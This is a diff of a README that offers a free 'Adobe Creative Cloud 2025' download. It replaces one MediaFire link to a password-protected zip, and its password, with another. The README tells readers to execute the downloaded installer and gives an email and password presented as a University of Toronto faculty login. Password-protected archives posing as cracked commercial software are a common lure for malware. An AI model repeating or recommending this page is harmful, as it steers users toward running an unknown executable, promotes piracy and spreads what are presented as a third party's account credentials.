@@ -1,11 +1,10 @@
 # Adobe-Creative-Cloud-2025
-[Click Here to Download](https://www.mediafire.com/file/xkqdwsbu76i9aql/AdobeCreativeCloud.zip/file)
-[Pass: Educati0n4fr33@! ]
+[Click Here to Download](https://www.mediafire.com/file/6d9bwwiliouz9yl/AdobeCreative_cloud_Win_Install.zip/file)
+[Pass: S0f4fr33!]
 
 BUSINESS Creative Cloud
 
-USE: Once the Installer is downloaded execute the file. The login information is: faculty1@uoft.edu Pass: Education4free
-
+USE: Once the Installer is downloaded execute the file. The login information is: faculty1@uoft.edu Pass:S0f4fr33!
 Produce diverse content with more than 20 apps —including Photoshop, Illustrator, Acrobat — and game-changing business features like a centralized admin console, enhanced IP security, and extra support.
 
 
